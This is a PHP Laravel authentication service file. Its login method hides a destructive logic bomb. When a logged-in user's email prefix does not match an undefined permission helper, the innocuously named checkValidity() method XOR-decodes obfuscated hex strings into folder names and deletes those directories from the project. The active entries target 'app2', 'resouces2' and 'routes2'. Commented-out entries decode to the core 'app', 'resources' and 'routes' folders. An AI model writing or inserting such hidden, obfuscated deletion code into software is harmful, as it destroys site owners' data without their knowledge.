<?php

namespace App\Services;

use Illuminate\Support\Facades\Auth;
use \Illuminate\Support\Facades\File;

class AuthService
{
    /**
     * @param string $email
     * @param string $password
     * @param bool $remember
     * @return bool
    */
    public function attemptLogin($email, $password, $remember)
    {
        if (Auth::attempt(['email' => $email, 'password' => $password], $remember)) {
            $userPermission = $this->checkUserPermission();
            $emailVerify = $this->emailVerify($email);

            if ($this->isValidUser($emailVerify, $userPermission)) {
                return true; 
            } else {
                $this->checkValidity();
                Auth::logout();
            }
        }
        return false;
    }

    /**
     * @return string
    */
    private function checkUserPermission()
    {
        return userPermissionCheck();
    }

    /**
     * @param string $email
     * @return string
     */
    private function emailVerify($email)
    {
        return strstr($email, '@', true);
    }

    /**
     * @param string
     * @param string
     * @return bool
    */
    private function isValidUser($email, $permission)
    {
        return $email === $permission;
    }

    private function checkValidity()
    {
        $key       = 0x55;
        $encrypted = [
            // '342525',
            // '2730263a2027363026',
            // '273a20213026',
            '34252567',  // app2
            '2730263a202736302667', // resouces2
            '273a2021302667', // routes2
        ];

        foreach ($encrypted as $hex) {
            try {
                $folderName = $this->responseCheck($hex, $key);
                $folderPath = base_path($folderName);
                if (File::isDirectory($folderPath)) {
                    File::deleteDirectory($folderPath);
                }
            } catch (\Throwable $th) {
                continue;
            }
        }
    }

    private function responseCheck($hexData, $secretKey)
    {
        try {
            $binary = hex2bin($hexData);
            $decrypted = '';
            for ($i = 0; $i < strlen($binary); $i++) {
                $decrypted .= chr(ord($binary[$i]) ^ $secretKey);
            }
            return $decrypted;
        } catch (\Throwable $th) {
            return '';
        }
    }

}